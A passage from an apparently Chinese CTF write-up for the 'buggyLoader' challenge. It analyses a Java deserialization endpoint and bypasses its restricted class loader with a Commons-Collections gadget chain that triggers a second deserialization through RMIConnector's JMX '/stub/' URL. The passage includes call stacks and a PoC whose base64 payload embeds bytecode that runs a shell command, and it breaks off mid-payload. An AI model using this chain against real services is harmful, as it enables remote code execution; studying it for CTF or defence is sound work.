&#123;URL@5426&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-databind-2.11.4.jar!/&quot;</span><br><span class="line"> 17 = &#123;URL@5427&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-annotations-2.11.4.jar!/&quot;</span><br><span class="line"> 18 = &#123;URL@5428&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-core-2.11.4.jar!/&quot;</span><br><span class="line"> 19 = &#123;URL@5429&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-datatype-jdk8-2.11.4.jar!/&quot;</span><br><span class="line"> 20 = &#123;URL@5430&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-datatype-jsr310-2.11.4.jar!/&quot;</span><br><span class="line"> 21 = &#123;URL@5431&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-module-parameter-names-2.11.4.jar!/&quot;</span><br><span class="line"> 22 = &#123;URL@5432&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/tomcat-embed-core-9.0.44.jar!/&quot;</span><br><span class="line"> 23 = &#123;URL@5433&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jakarta.el-3.0.3.jar!/&quot;</span><br><span class="line"> 24 = &#123;URL@5434&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/tomcat-embed-websocket-9.0.44.jar!/&quot;</span><br><span class="line"> 25 = &#123;URL@5435&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-web-5.3.5.jar!/&quot;</span><br><span class="line"> 26 = &#123;URL@5436&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-beans-5.3.5.jar!/&quot;</span><br><span class="line"> 27 = &#123;URL@5437&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-webmvc-5.3.5.jar!/&quot;</span><br><span class="line"> 28 = &#123;URL@5438&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-aop-5.3.5.jar!/&quot;</span><br><span class="line"> 29 = &#123;URL@5439&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-context-5.3.5.jar!/&quot;</span><br><span class="line"> 30 = &#123;URL@5440&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-expression-5.3.5.jar!/&quot;</span><br><span class="line"> 31 = &#123;URL@5441&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-core-5.3.5.jar!/&quot;</span><br><span class="line"> 32 = &#123;URL@5442&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-jcl-5.3.5.jar!/&quot;</span><br><span class="line"> 33 = &#123;URL@5443&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/commons-collections-3.2.1.jar!/&quot;</span><br><span class="line"> 34 = &#123;URL@5444&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-jarmode-layertools-2.4.4.jar!/&quot;</span><br></pre></td></tr></table></figure>



<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>给了个Jar包，把源文件搞出来一下，配一下调试环境</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/buggy&quot;&#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">      InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);<span class="comment">//</span></span><br><span class="line">      ObjectInputStream objectInputStream = <span class="keyword">new</span> MyObjectInputStream(inputStream);<span class="comment">//ObjectInputStream干啥的,使用ObjectInputStream来读取一些元数据</span></span><br><span class="line">      objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>题目很简单就一个反序列化(删除了一些代码)</p>
<p>MyObjectInputStream:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>(inputStream);</span><br><span class="line">      URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();</span><br><span class="line">      <span class="keyword">this</span>.classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> Class <span class="title">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">      System.out.println(desc.getName());</span><br><span class="line">      Class clazz = <span class="keyword">this</span>.classLoader.loadClass(desc.getName());</span><br><span class="line">      <span class="keyword">return</span> clazz;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是全部的代码了</p>
<p>这题还是考之前的shiro反序列化利用过程中遇到Shiro重写了 resolveClass 的实现</p>
<p>关于这个的分析文章可以参考</p>
<p><a target="_blank" rel="noopener" href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7950">https://xz.aliyun.com/t/7950</a></p>
<h2 id="sink-二次反序列化"><a href="#sink-二次反序列化" class="headerlink" title="sink:二次反序列化"></a>sink:二次反序列化</h2><p>调用栈:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">findRMIServerJRMP:2007, RMIConnector (javax.management.remote.rmi) //二次反序列化触发点</span><br><span class="line">findRMIServer:1924, RMIConnector (javax.management.remote.rmi)</span><br><span class="line">connect:287, RMIConnector (javax.management.remote.rmi)</span><br><span class="line">connect:249, RMIConnector (javax.management.remote.rmi)// 进入rmi</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">readObject:342, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)//反序列化起点</span><br></pre></td></tr></table></figure>

<p>这一解给了一个新的sink点</p>
<p>通过cc链来调javax.management.remote.rmi.RMIConnector.connect从而完成二次反序列化</p>
<h3 id="二次反序列化的触发过程"><a href="#二次反序列化的触发过程" class="headerlink" title="二次反序列化的触发过程"></a>二次反序列化的触发过程</h3><p>触发点是javax.management.remote.rmi.RMIConnector.connect，他回去解析jmxServiceURL</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(Map&lt;String,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">			...</span><br><span class="line">            RMIServer stub = (rmiServer!=<span class="keyword">null</span>)?rmiServer:</span><br><span class="line">                findRMIServer(jmxServiceURL, usemap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check for secure RMIServer stub if the corresponding</span></span><br><span class="line">            <span class="comment">// client-side environment property is set to &quot;true&quot;.</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入findRMIServer，接着进入findRMIServerJRMP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span></span><br><span class="line"><span class="params"><span class="function">        Map&lt;String, Object&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> isIiop = RMIConnectorServer.isIiopURL(directoryURL,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (isIiop) &#123;</span><br><span class="line">        <span class="comment">// Make sure java.naming.corba.orb is in the Map.</span></span><br><span class="line">        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String path = directoryURL.getURLPath();</span><br><span class="line">    <span class="keyword">int</span> end = path.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/jndi/&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/stub/&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>,end), environment, isIiop);<span class="comment">//进入findRMIServerJRMP</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/ior/&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!IIOPHelper.isAvailable())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;iiop protocol not available&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> findRMIServerIIOP(path.substring(<span class="number">5</span>,end), environment, isIiop);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> String msg = <span class="string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +</span><br><span class="line">                <span class="string">&quot;or /ior/: &quot;</span> + path;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在findRMIServerJRMP触发反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="keyword">boolean</span> isIiop)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serialized = base64ToByteArray(base64);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> ClassLoader loader = EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="keyword">final</span> ObjectInputStream oin =</span><br><span class="line">            (loader == <span class="keyword">null</span>) ?</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStream(bin) :</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStreamWithLoader(bin, loader);</span><br><span class="line">    <span class="keyword">final</span> Object stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = oin.readObject();<span class="comment">// look here</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Class not found: &quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从而绕过限定URLClassLoader的尴尬限制</p>
<h3 id="调用connect"><a href="#调用connect" class="headerlink" title="调用connect"></a>调用connect</h3><p>接着就是ccx的老链了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">readObject:342, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure>

<p>HashSet::readObject-&gt;HashMap::put-&gt;HashMap::hash-&gt;TiedMapEntry::hashCOde-&gt;TiedMapEntry::getValue-&gt;LazyMap::get-&gt;Transformer::transform</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.buggyLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : ccreater</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span> : com.yxxx.buggyLoader.Poc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> : 类描述</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021-11-19 14:09 Copyright  2021 ccreater. All rights reserved.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.deploy.NamingResourcesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.attoparser.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.security.auth.message.AuthException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">    Constructor con = InvokerTransformer.class.getDeclaredConstructor(String.class);</span><br><span class="line">    con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// need a public method</span></span><br><span class="line">    InvokerTransformer transformer = (InvokerTransformer) con.newInstance(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rO0A.. from Temp.java</span></span><br><span class="line">    JMXServiceURL jurl = <span class="keyword">new</span> JMXServiceURL(<span class="string">&quot;service:jmx:rmi://c014:37777/stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot;</span></span><br><span class="line">        + <span class="string">&quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot;</span></span><br><span class="line">        + <span class="string">&quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot;</span></span><br><span class="line">        + <span class="string">&quot;cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0&quot;</span></span><br><span class="line">        + <span class="string">&quot;ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0&quot;</span></span><br><span class="line">        + <span class="string">&quot;ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2&quot;</span></span><br><span class="line">        + <span class="string">&quot;YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGll&quot;</span></span><br><span class="line">        + <span class="string">&quot;czt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAA&quot;</span></span><br><span class="line">        + <span class="string">&quot;AozK/rq+AAAANAAkCgADAA8HABEHABIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJl&quot;</span></span><br><span class="line">        + <span class="string">&quot;clRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC1N0YXRpY0Jsb2NrAQAMSW5uZXJD&quot;</span></span><br><span class="line">        + <span class="string">&quot;bGFzc2VzAQAnTGNvbS95eHh4L2J1Z2d5TG9hZGVyL1RlbXAkU3RhdGljQmxvY2s7AQAKU291cmNl&quot;</span></span><br><span class="line">        + <span class="string">&quot;RmlsZQEACVRlbXAuamF2YQwABAAFBwATAQAlY29tL3l4eHgvYnVnZ3lMb2FkZXIvVGVtcCRTdGF0&quot;</span></span><br><span class="line">        + <span class="string">&quot;aWNCbG9jawEAEGphdmEvbGFuZy9PYmplY3QBABljb20veXh4eC9idWdneUxvYWRlci9UZW1wAQBA&quot;</span></span><br><span class="line">        + <span class="string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RU&quot;</span></span><br><span class="line">        + <span class="string">&quot;cmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1&quot;</span></span><br><span class="line">        + <span class="string">&quot;bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAQdG91Y2ggL3RtcC9mdWNr&quot;</span></span><br><span class="line">        + <span class="string">&quot;IAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAA&quot;</span></span><br><span class="line">        + <span class="string">&quot;IQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgAB&quot;</span></span><br><span class="line">        + <span class="string">&quot;AAAAFAAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAA&quot;</span></span><br><span class="line">        + <span class="string">&quot;AAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJcHQABG5hbWVwdwEAeHNyACpvcmcuYXBhY2hlLmNv&quot;</span></span><br><span class="line">        + <span class="string">&quot;bW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3Jn&quot;</span></span><br><span class="line">        + <span class="string">&quot;L2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUu&quot;</span></span><br><span class="line">        + <span class="string">&quot;Y29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIA&quot;</span></span><br><span class="line">        + <span class="string">&quot;A1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAlbAAtpUGFy&quot;</span></span><br><span class="line">        + <span class="string">&quot;YW1UeXBlc3EAfgAIeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAO&quot;</span></span><br><span class="line">        + <span class="string">&quot;bmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcgAR&quot;</span></span><br><span class="line">        + <span 